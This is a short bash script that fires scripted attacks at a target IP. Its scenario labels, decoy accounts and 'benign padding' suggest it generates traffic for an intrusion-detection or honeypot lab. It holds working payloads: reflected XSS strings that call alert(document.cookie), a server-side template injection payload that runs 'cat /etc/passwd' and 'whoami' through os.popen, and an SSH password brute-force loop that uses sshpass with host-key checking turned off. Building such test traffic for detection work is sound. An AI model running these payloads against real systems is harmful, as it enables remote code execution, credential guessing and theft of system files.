#!/bin/bash
TARGET_IP="$1"
echo "=== SCENARIO3_START $(date -u +%Y-%m-%dT%H:%M:%S.%3NZ) ==="

echo "--- [24] Reflected XSS attack ---"
curl -s -m 5 "http://$TARGET_IP/profile?name=%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E" >/dev/null
curl -s -m 5 "http://$TARGET_IP/profile?name=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E" >/dev/null

echo "--- [25] SSTI -> RCE attack (reads /etc/passwd via template injection) ---"
curl -s -m 5 -G "http://$TARGET_IP/greet" --data-urlencode "note={{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat /etc/passwd').read() }}" >/dev/null
curl -s -m 5 -G "http://$TARGET_IP/greet" --data-urlencode "note={{ self.__init__.__globals__.__builtins__.__import__('os').popen('whoami').read() }}" >/dev/null

echo "--- [26] SECOND successful brute force: different decoy account, different wordlist ---"
for p in Monday123 Tuesday123 letmein99 Passw0rd! Bilbo2026; do
  timeout 5 sshpass -p "$p" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 "svc_reports@$TARGET_IP" "whoami" 2>/dev/null
done

echo "--- [27] Benign padding: normal browsing + legitimate app usage ---"
curl -s -m 5 "http://$TARGET_IP/profile?name=Alice" >/dev/null
curl -s -m 5 -G "http://$TARGET_IP/greet" --data-urlencode "note=Thanks for shopping with us!" >/dev/null
for q in mug speaker; do
  curl -s -m 5 "http://$TARGET_IP/search?q=$q" >/dev/null
done
timeout 8 sshpass -p "Sup3rS3cure!2026" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 "testuser@$TARGET_IP" "echo ok2" 2>/dev/null

echo "=== SCENARIO3_END $(date -u +%Y-%m-%dT%H:%M:%S.%3NZ) ==="
